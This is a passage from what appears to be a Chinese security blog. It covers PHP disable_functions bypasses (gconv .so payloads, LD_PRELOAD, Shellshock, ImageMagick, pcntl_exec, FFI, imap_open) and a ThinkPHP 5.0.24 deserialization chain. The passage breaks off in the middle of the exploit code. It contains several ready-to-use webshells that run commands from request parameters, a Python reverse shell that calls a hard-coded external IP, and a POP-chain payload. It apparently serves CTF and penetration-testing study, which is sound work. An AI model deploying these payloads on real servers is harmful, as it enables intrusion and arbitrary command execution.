<p><code>iconv</code>触发或php伪协议过滤器触发</p>
</li>
<li class="lvl-2">
<p>存在可写的目录, 需要上传 <code>.so</code> 文件</p>
</li>
</ul>
<p>原理介绍:<a href="https://blog.csdn.net/qq_42303523/article/details/117911859">https://blog.csdn.net/qq_42303523/article/details/117911859</a></p>
<p>利用方法:</p>
<ol>
<li class="lvl-3">
<p>上传gconv-modules文件至可写入目录一般为/tmp(该文件用于指定解析字符集.so文件所在位置)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//gconv-modules内容</span><br><span class="line"></span><br><span class="line">module  PAYLOAD//    INTERNAL    ../../../../../../../../home/user/payload </span><br><span class="line">module  INTERNAL    PAYLOAD//    ../../../../../../../../home/user/payload </span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>上传payload.so至可写入目录一般为/tmp(该文件用于shell执行我们想要操作)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//payload.so由payload.c解析而成</span><br><span class="line">//解析指令gcc payload.c -o payload.so -shared -fPIC</span><br><span class="line">//注意要在相类似的linux环境解析.so文件,避免兼容问题</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void gconv() &#123;&#125;</span><br><span class="line"></span><br><span class="line">void gconv_init() &#123;</span><br><span class="line">  puts(&quot;pwned&quot;);</span><br><span class="line">  system(&quot;/readflag &gt; /tmp/ki1ro&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>上传触发文件或直接触发(触发的语言选择多样)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1.编译下面的poc.c代码为.so然后上传执行触发</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">  putenv(&quot;GCONV_PATH=.&quot;);</span><br><span class="line">  FILE *fp = fopen(&quot;some_random_file&quot;, &quot;w,ccs=payload&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//2.php代码直接触发iconv_open,eval执行下面这段代码</span><br><span class="line">putenv(&quot;GCONV_PATH=/tmp/&quot;);</span><br><span class="line">show_source(&quot;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&quot;);或者iconv(&quot;hacker&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;);</span><br><span class="line"></span><br><span class="line">//3.上传php文件触发,include包含</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="3-利用-LD-PRELOAD-环境变量">3.利用 LD_PRELOAD 环境变量</h4>
<p>思路为(其实和上面的iconv利用很像):</p>
<ol>
<li class="lvl-3">
<p>创建一个.so文件,linux的动态链接库文件</p>
</li>
<li class="lvl-3">
<p>使用putenv函数将<code>LD_PRELOAD</code>路径设置为我们自己创建的动态链接库文件</p>
</li>
<li class="lvl-3">
<p>利用某个函数去触发该动态链接库</p>
</li>
</ol>
<p>利用方法:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>上传利用.so文件到可上传目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//直接下载大佬的.so文件即可32为linux下x86，64位下载x64</span><br><span class="line">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>上传利用.php文件到可上传目录或者直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//直接下载即可</span><br><span class="line">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.php</span><br><span class="line">//该php文件需要get三个参数</span><br><span class="line">//cmd参数为需要执行的命令</span><br><span class="line">//outpath为命令执行后输出的结果文件位置(一般/tmp/result)</span><br><span class="line">//sopath为上传的.so文件位置(一般/tmp/bypass_disablefunc_x64.so)</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-2">
<p>执行.php文件。如果有条件就上传php文件到/var/www/html目录,不行的话就文件包含.php文件</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817397.png" alt=""></p>
</li>
</ul>
<h4 id="4-利用Windows组件COM绕过">4.利用Windows组件COM绕过</h4>
<p>利用条件:</p>
<ol>
<li class="lvl-3">
<p>windows下</p>
</li>
<li class="lvl-3">
<p>开启com组件</p>
</li>
</ol>
<p>利用方法:</p>
<ol>
<li class="lvl-3">
<p>上传php脚本文件,文件包含或者直接访问文件,cmd参数提交命令</p>
</li>
</ol>
<h4 id="5-利用-SplDoublyLinkedList-UAC">5.利用 SplDoublyLinkedList UAC</h4>
<p>利用条件：</p>
<ol>
<li class="lvl-3">
<p>PHP v7.4.10及其之前版本</p>
</li>
<li class="lvl-3">
<p>PHP v8.0（Alpha）</p>
</li>
</ol>
<p>原理详见:<a href="https://www.freebuf.com/articles/web/251017.html">https://www.freebuf.com/articles/web/251017.html</a></p>
<p>利用方法:</p>
<ol>
<li class="lvl-3">
<p>上传php脚本文件,文件包含或者直接访问文件,cmd参数提交命令</p>
</li>
<li class="lvl-3">
<p>直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
</li>
<li class="lvl-3">
<p>注意该利用脚本文件上传后只能执行一次命令,要再次执行需要重新上传</p>
</li>
</ol>
<h4 id="6-利用-GC-UAF">6.利用 GC UAF</h4>
<p>利用条件</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Linux 操作系统</p>
</li>
<li class="lvl-2">
<p>PHP7.0 - all versions to date</p>
</li>
<li class="lvl-2">
<p>PHP7.1 - all versions to date</p>
</li>
<li class="lvl-2">
<p>PHP7.2 - all versions to date</p>
</li>
<li class="lvl-2">
<p>PHP7.3 - all versions to date</p>
</li>
</ul>
<p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">EXP</a><br>
<a href="http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(1st)/">关于原理</a>原理:通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令。</p>
<p>利用方法:</p>
<ol>
<li class="lvl-3">
<p>上传利用脚本,文件包含或者直接访问文件,cmd参数提交命令</p>
</li>
<li class="lvl-3">
<p>或者直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
</li>
</ol>
<h4 id="7-利用-Json-Serializer-UAF">7.利用 Json Serializer UAF</h4>
<p>利用条件</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Linux 操作系统</p>
</li>
<li class="lvl-2">
<p>PHP7.1 - all versions to date</p>
</li>
<li class="lvl-2">
<p>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</p>
</li>
<li class="lvl-2">
<p>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</p>
</li>
</ul>
<p><a href="https://bugs.php.net/bug.php?id=77843">利用漏洞</a><br>
<a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">POC</a></p>
<p>利用方法:</p>
<ol>
<li class="lvl-3">
<p>上传利用脚本,文件包含或者直接访问文件,cmd参数提交命令</p>
</li>
<li class="lvl-3">
<p>或者直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
</li>
</ol>
<h4 id="8-利用Backtrace-UAF">8.利用Backtrace UAF</h4>
<p>利用条件</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Linux 操作系统</p>
</li>
<li class="lvl-2">
<p>PHP7.0 - all versions to date</p>
</li>
<li class="lvl-2">
<p>PHP7.1 - all versions to date</p>
</li>
<li class="lvl-2">
<p>PHP7.2 - all versions to date</p>
</li>
<li class="lvl-2">
<p>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</p>
</li>
<li class="lvl-2">
<p>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</p>
</li>
</ul>
<p><a href="https://bugs.php.net/bug.php?id=76047">利用漏洞</a><br>
<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">EXP</a></p>
<p>利用方法:</p>
<ol>
<li class="lvl-3">
<p>上传利用脚本,文件包含或者直接访问文件,cmd参数提交命令</p>
</li>
<li class="lvl-3">
<p>或者直接粘贴php代码通过eval()执行(需要先进行url编码)</p>
</li>
</ol>
<h4 id="9-利用Bash-Shellshock-CVE-2014-6271-破壳漏洞">9.利用Bash Shellshock(CVE-2014-6271)破壳漏洞</h4>
<p>利用条件:php &lt; 5.6.2 &amp; bash &lt;= 4.3（破壳）</p>
<p>原理介绍:Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p>
<p>利用方法:</p>
<ol>
<li class="lvl-3">
<p>简单测试:命令行输入<code>env x='() &#123; :;&#125;; echo vulnerable' bash -c &quot;echo this is a test&quot;</code>如果输出了<code>vulnerable</code>，则说明存在bash破壳漏洞</p>
</li>
<li class="lvl-3">
<p>上传exp php文件,文件包含或者访问该文件,cmd传shell指令看是否有反应</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function shellshock($cmd) &#123; // Execute a command via CVE-2014-6271 @mail.c:283 </span><br><span class="line">   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); </span><br><span class="line">   putenv(&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;); </span><br><span class="line">   // In Safe Mode, the user may only alter environment variableswhose names </span><br><span class="line">   // begin with the prefixes supplied by this directive. </span><br><span class="line">   // By default, users will only be able to set environment variablesthat </span><br><span class="line">   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span><br><span class="line">   // PHP will let the user modify ANY environment variable! </span><br><span class="line">   //mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span><br><span class="line">   error_log(&#x27;a&#x27;,1);</span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   if($output != &quot;&quot;) return $output; </span><br><span class="line">   else return &quot;No output, or not vuln.&quot;; </span><br><span class="line">&#125; </span><br><span class="line">echo shellshock($_REQUEST[&quot;cmd&quot;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="10-利用ImageMagick-漏洞绕过-CVE-2016–3714">10.利用ImageMagick 漏洞绕过(CVE-2016–3714)</h4>
<p>利用条件:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>目标主机安装了漏洞版本的imagemagick（&lt;= 3.3.0）</p>
</li>
<li class="lvl-2">
<p>安装了php-imagick拓展并在php.ini中启用；</p>
</li>
<li class="lvl-2">
<p>编写php通过new Imagick对象的方式来处理图片等格式文件；</p>
</li>
<li class="lvl-2">
<p>PHP &gt;= 5.4</p>
</li>
</ul>
<p>原理简介:存在该漏洞时处理恶意构造带有shell命令的图片时,会执行shell命令</p>
<p>利用方法:</p>
<ol>
<li class="lvl-3">
<p>上传exp php文件,文件包含或者访问该文件,cmd传shell指令看是否有反应</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable Functions: &quot; . ini_get(&#x27;disable_functions&#x27;) . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$command = PHP_SAPI == &#x27;cli&#x27; ? $argv[1] : $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if ($command == &#x27;&#x27;) &#123;</span><br><span class="line">    $command = &#x27;id&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit = &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://example.com/image.jpg&quot;|$command&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;KKKK.mvg&quot;, $exploit);</span><br><span class="line">$thumb = new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&#x27;KKKK.mvg&#x27;);</span><br><span class="line">$thumb-&gt;writeImage(&#x27;KKKK.png&#x27;);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(&quot;KKKK.mvg&quot;);</span><br><span class="line">unlink(&quot;KKKK.png&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="11-利用pcntl-exec">11.利用pcntl_exec</h4>
<p>使用条件:<strong>PHP安装并启用了pcntl插件</strong></p>
<p>介绍:pcntl是linux下的一个扩展，可以支持php的多线程操作。很多时候会碰到禁用exec函数的情况，但如果运维人员安全意识不强或对PHP不甚了解，则很有可能忽略pcntl扩展的相关函数。<strong>pcntl_exec()是pcntl插件专有的命令执行函数来执行系统命令函数</strong>，可以在当前进程空间执行指定的程序。</p>
<p>利用方法:</p>
<ol>
<li class="lvl-3">
<p>上传pass.sh到可上传目录如/tmp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内容如下</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">ls -l /</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>利用pcntl_exec()<a href="http://xn--test-pk6hg45q.sh">执行test.sh</a>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#利用方式上传这一段代码并访问执行,或者文件包含该段代码</span></span><br><span class="line"><span class="comment">#或者直接eval执行pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/pass.sh&quot;));</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">   <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/pass.sh&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;pcntl extension is not support!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>由于pcntl_exec()执行命令是没有回显的，所以其常与python结合来反弹shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php pcntl_exec(&quot;/usr/bin/python&quot;,array(&#x27;-c&#x27;,&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;));</span><br></pre></td></tr></table></figure>
<h4 id="12-利用PHP7-4-FFI绕过">12.利用PHP7.4 FFI绕过</h4>
<p>介绍:FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。<strong>简单地说，就是一项让你在PHP里能够调用C代码的技术</strong>。</p>
<p>利用条件:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>php版本7.4及以上</p>
</li>
<li class="lvl-2">
<p>FFI开启,并且ffi.enable需要设置为true</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202403080817398.png" alt=""></p>
</li>
</ul>
<p>利用代码示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#可用将这串代码上传到/tmp/然后文件包含或者直接上传到../html/直接访问</span><br><span class="line">#返回结果将会写入/tmp/pass，并在每次读出结果后用unlink()函数删除它。</span><br><span class="line">&lt;?php</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$ffi-&gt;system(&quot;$cmd &gt; /tmp/pass&quot;);       //由GET传参的任意代码执行</span><br><span class="line">echo file_get_contents(&quot;/tmp/pass&quot;);  //如果file_get_contents被禁用,就放到web目录访问</span><br><span class="line">@unlink(&quot;/tmp/pass&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="13-利用攻击PHP-FPM">13.利用攻击PHP-FPM</h4>
<p>利用条件:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Linux 操作系统</p>
</li>
<li class="lvl-2">
<p>PHP-FPM</p>
</li>
<li class="lvl-2">
<p>存在可写的目录, 需要上传 .so 文件</p>
</li>
</ul>
<p>利用方法:以后补充</p>
<h4 id="14-利用-Apache-Mod-CGI">14.利用 Apache Mod CGI</h4>
<p>利用条件:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Apache + PHP (apache 使用 apache_mod_php)</p>
</li>
<li class="lvl-2">
<p>Apache 开启了 cgi, rewrite</p>
</li>
<li class="lvl-2">
<p>Web 目录给了 AllowOverride 权限</p>
</li>
</ul>
<p>原理介绍:</p>
<p>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。当Apache 开启了cgi, rewrite时，我们可以利用.htaccess文件，临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序，则可以在目的目录下使用.htaccess文件进行配置。</p>
<p>利用方法:遇到后补充</p>
<h4 id="15-利用imap-open-绕过">15.利用imap_open()绕过</h4>
<p>利用条件:需要安装iamp扩展,命令行输入:<code>apt-get install php-imap</code></p>
<p>原理介绍:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。</span><br></pre></td></tr></table></figure>
<p>利用方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#上传下面的代码到服务器,文件包含或直接访问该文件</span><br><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">if (!function_exists(&#x27;imap_open&#x27;)) &#123; </span><br><span class="line">die(&quot;no imap_open function!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">$server = &quot;x -oProxyCommand=echot&quot;.base64_encode($_GET[&#x27;cmd&#x27;].&quot;&gt;/tmp/cmd_result&quot;) . &quot;|base64t-d|sh&#125;&quot;; </span><br><span class="line">imap_open(&#x27;&#123;&#x27; . $server . &#x27;:143/imap&#125;INBOX&#x27;, &#x27;&#x27;, &#x27;&#x27;); // or</span><br><span class="line">var_dump(&quot;nnError: &quot;.imap_last_error()); </span><br><span class="line">sleep(5); </span><br><span class="line">echo file_get_contents(&quot;/tmp/cmd_result&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp-5.0.*-反序列化漏洞</title>
    <url>/LtmThink/2024/01/19/thinkphp-5.0.-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞环境">漏洞环境:</h2>
<p>版本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ThinkPHP V5.0.24</span><br><span class="line">php v7.1.9</span><br></pre></td></tr></table></figure>
<p>测试代码:</p>
<p>application目录下新建一个一个模块test在controller文件夹内创建Test.php内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#命名空间app默认位于application</span><br><span class="line">namespace app\test\controller;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">	//访问http://localhost/tp5.0/public/index.php/test/test/hello</span><br><span class="line">	//或者传递参数访问http://localhost/tp5.0/public/index.php/test/test/hello/pass/参数</span><br><span class="line">    public function hello($pass = &#x27;pass&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        unserialize(base64_decode($pass));</span><br><span class="line">        return &#x27;hello&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析">漏洞分析:</h2>
<p>类似thinkphp-5.1.*的反序列化漏洞,thinkphp-5.0.*-反序列化漏洞的入口点是</p>
<p>tp5.0\thinkphp\library\think\process\pipes\Windows.php的__destruct()方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432759.png" alt="image-20240118145113219"></p>
<p>同样进入removeFiles(),可用看到这里同样是有反序列化+任意文件删除的漏洞组合的(相关poc见我写的thinkphp-5.1.*-反序列化漏洞分析)。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432760.png" alt="image-20240118145208238"></p>
<p>我们通过file_exists是可以触发<code>__toString</code>的,这里我们通过全局搜索可以发现\tp5.0\thinkphp\library\think\Model.php 的抽象类Model存在<code>__toString</code>方法。因为Model是抽象类,我们无法直接实例化,于是搜索继承Model的类,我们发现Pivot类继承了Model。以Pivot类为跳板通过file_exists(new Pivot)的形式我们就可以调用<code>__toString</code>方法了。</p>
<p>我们来看<code>__toString</code>方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432761.png" alt="image-20240118150100331"></p>
<p>进入toJson()</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432762.png" alt="image-20240118150115854"></p>
<p>接着进入toArray()。我们在其912行看到<code>$value-&gt;getAttr($attr)</code>,在这里我们需要$value成为类Output,这样就可以触发Output的<code>__call()</code>方法。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432763.png" alt="image-20240118150324277"></p>
<p>我们查看getRelationData(),发现需要满足三个条件即可使得<code>$value</code>可控,一眼看过去第一个条件<code>$this-&gt;parent</code>我们可以控制。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432764.png" alt="image-20240118171609516"></p>
<p>查看isSelfRelation(),显然$this-&gt;selfRelation我们可以控制,所以第二个条件<code>!$modelRelation-&gt;isSelfRelation()</code>我们可以控制</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432765.png" alt="image-20240118171834387"></p>
<p>第三个条件<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</code>需要我们使得<code>get_class($modelRelation-&gt;getModel())</code>的结果是Output对象。我们进入getModel()查看,可以发现这里调用了<code>$this-&gt;query</code>的<code>getModel()</code>方法,<code>$this-&gt;query</code>我们是可控的。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432766.png" alt="image-20240118172843427"></p>
<p>继续深入<code>getModel()</code>方法,我们发现Query类存在<code>getModel()</code>方法,<code>$this-&gt;model</code>我们也可以控制的,所以我们需要使得<code>$this-&gt;query</code>为Query对象,Query对象的<code>$this-&gt;model</code>为output对象。这样就可以通过第三个条件的验证了。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432768.png" alt="image-20240118173451138"></p>
<p>因为Relation是抽象类那么要使得<code>$this-&gt;query</code>为Query对象,我们就要寻找一个继承Relation的类。考虑到toArray()方法第904行的验证我们还需要这个类含有getBindAttr()方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432763.png" alt="image-20240118150324277"></p>
<p>通过全局搜索我们可以找到这么一个类HasOne。HasOne继承自OneToOne而OneToOne则继承自Relation。所以HasOne满足我们的要求。</p>
<p>现在我们只需要使得<code>$modelRelation</code>为HasOne对象。从第901行我们可以知道通过调用<code>this-&gt;$relation</code>方法获得的<code>$modelRelation</code>。而<code>$relation</code>是通过<code>$name</code>得到的,<code>$name</code>可控。所以我们只需在Model抽象类中找到一个方法可以返回一个HasOne对象即可。<code>$this-&gt;error</code>可控,getError方法满足我们的要求。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401191432769.png" alt="image-20240118183100185"></p>
<p>所以到目前为止我们构造的反序列化链条如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()]; <span class="comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>();  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//调用getError 返回this-&gt;error</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();               <span class="comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span> <span class="title class_">extends</span> <span class="title class_">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span 